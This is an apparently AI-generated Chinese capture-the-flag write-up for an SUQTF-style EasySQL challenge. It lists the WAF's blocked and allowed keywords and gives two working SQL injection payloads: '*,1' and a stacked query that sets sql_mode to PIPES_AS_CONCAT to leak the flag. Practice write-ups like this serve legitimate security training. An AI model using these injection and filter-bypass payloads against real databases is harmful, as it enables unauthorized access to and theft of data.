---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: '8326520f-d7bc-4eaa-9b40-3e1ac9e31267'
  PropagateID: '8326520f-d7bc-4eaa-9b40-3e1ac9e31267'
  ReservedCode1: '2664db28-732c-4637-8ef6-e58ca8c275b3'
  ReservedCode2: '2664db28-732c-4637-8ef6-e58ca8c275b3'
---

# SUCTF 2019 EasySQL 变体 — 堆叠注入绕过 from 过滤

## 题目特征
- 页面文案："Give me your flag, I will tell you if the flag is right"
- POST 表单，参数名 `query`
- 输入非零数字返回 `Array([0] => 1)`，输入0或字符串无返回
- 数据库：MariaDB 10.x，数据库名 `ctf`，表名 `f1ag`

## SQL 语义
```sql
select $input||flag from f1ag
```
- `||` 在 MySQL/MariaDB 默认是逻辑 OR 运算符
- 输入1 → `1||flag_col` → 1 OR flag_value → 1（因为1为真）
- 输入0 → `0||flag_col` → 0 OR flag_value → flag是字符串转为0 → 0 → 无返回
- 任何非零整数 → 逻辑OR后为1 → 返回 `[0] => 1`

## WAF 过滤列表
| 被拦截 | 可用 |
|--------|------|
| `and`, `or`, `union` | `^` (XOR), `||` (逻辑OR) |
| `from`（大小写不敏感、内联注释、双写均不行） | `*`（通配符） |
| `information_schema`, `performance_schema` | `mid`, `ascii`, `length` |
| `handler`, `prepare`, `execute` | `concat`, `group_concat`, `substr` |
| `sleep`, `if`, `case/when/then/else` | `left`, `right`, `char`, `hex` |
| `like`, `regexp`, `in` | `database()`, `version()`, `user()` |
| `updatexml`, `extractvalue`, `floor`, `rand` | `set`, `rename` |
| `flag`（关键词） | `benchmark`, `cast`, `conv`, `bin`, `oct` |
| 输入长度限制40字符 | `show`, `desc`, `use` |
| `create`, `drop` | `alter table ... rename to` |

## 解法

### 解法1：非预期解 — `*,1`
```
query=*,1
```
SQL 变为 `select *,1||flag from f1ag` = `select *,1 from f1ag`
返回所有列 + 常量1，flag 在第一列中。

### 解法2：预期解 — sql_mode PIPES_AS_CONCAT
```
query=1;set sql_mode=pipes_as_concat;select 1
```
- `set sql_mode=pipes_as_concat` 将 `||` 从逻辑 OR 改为字符串拼接
- 第三条语句 `select 1||flag from f1ag` 变为 `select concat(1,flag) from f1ag`
- 返回 `1CTF2{...}`，去掉前缀1即可得到flag

## 关键知识点
1. **`||` 双重语义**：MySQL/MariaDB 默认 `||` = 逻辑OR，设置 `PIPES_AS_CONCAT` 后 = 字符串拼接（Oracle兼容）
2. **`select *` 绕过列名**：不需要知道列名即可读取整行数据
3. **`from` 在 SQL 语句本身中不会被 WAF 拦截**：WAF 只检查用户输入，SQL 模板中的 `from` 不经过 WAF
4. **堆叠注入**：PDO + `mysqli_multi_query` 允许执行多条SQL，所有结果通过 `do-while(mysqli_next_result)` 返回

## 隶属题型
- 堆叠注入
- WAF 绕过（from 过滤）
- SUCTF 2019 EasySQL 变体
- DASCTF 平台

> AI生成